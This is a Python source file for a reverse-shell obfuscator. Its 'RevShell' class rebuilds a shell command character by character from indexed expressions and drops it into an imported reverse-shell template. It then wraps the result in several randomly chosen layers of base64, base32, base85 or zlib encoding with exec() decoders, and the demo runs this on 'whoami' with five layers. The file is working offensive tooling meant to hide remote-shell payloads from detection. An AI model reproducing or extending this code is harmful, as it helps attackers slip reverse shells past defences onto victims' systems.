import base64

from revshell_options import options,obfuscated_revshell
import random

class RevShell:
    def __init__(self,code,should_pack=0):
        self.code = code
        self.should_pack = should_pack
        self.obfuscated_code = []
        self.obfuscated_final = ""
        self.pack_list = {"base64.b64encode" : "import base64\nexec(base64.b64decode({}.decode()))",
                          "base64.b32encode" : "import base64\nexec(base64.b32decode({}.decode()))",
                          "base64.b16encode" : "import base64\nexec(base64.b16decode({}.decode()))",
                          "base64.a85encode": "import base64\nexec(base64.a85decode({}.decode()))",
                          "base64.b85encode": "import base64\nexec(base64.b85decode({}.decode()))",
                         # "builtins.compile" : "import marshal;exec(marshal.loads({}))",
                          "zlib.compress" : "import zlib \nexec(zlib.decompress({}).decode())"
                          }

    def find_char(self,char):
        for option_index, option in enumerate(options):
            evaled_option = eval(option.strip())
            for index, n_char in enumerate(evaled_option):
                if char == n_char:
                    return {'to_eval': option, 'index': index}
        return {}


    def pack(self):
        choice = random.choice(list(self.pack_list.keys()))
        module = choice.split('.')[0]
        func = choice.split('.')[1]
        self.obfuscated_final = self.pack_list[choice].format(getattr(__import__(module),func)(self.obfuscated_final.encode()))
        return self.obfuscated_final

    def obfuscator(self):
        for index, char in enumerate([i for i in self.code]):
            if self.find_char(char):
                query = self.find_char(char)
                q_index = query['index']
                if q_index == 2:
                    q_index = "_+_"
                elif q_index == 3:
                    q_index = "_ + _ + _"
                elif q_index == 4:
                    q_index = "_ + _ +_ +_"
                elif q_index == 5:
                    q_index = "_ +_ +_ +_ +_"
                elif q_index == 0:
                    q_index = "_ - _"
                elif q_index == 6:
                    q_index = "___ +_ + _ +_"
                elif q_index == 7:
                    q_index = "____ + _ +_ +_"
                elif q_index == 8:
                    q_index = "______ + __"
                elif q_index == 1:
                    q_index = "_"
                self.obfuscated_code.append(f"{query['to_eval']}[{q_index}]\n")
            else:
                raise "Error!"
        self.obfuscated_code.append(' "&"')
        self.obfuscated_final = obfuscated_revshell.replace('placeholder','+'.join(self.obfuscated_code))
        if self.should_pack:
            for i in range(self.should_pack):
                self.obfuscated_final = self.pack()
        return self.obfuscated_final



x = RevShell("""whoami""",should_pack=5)
print(x.obfuscator())









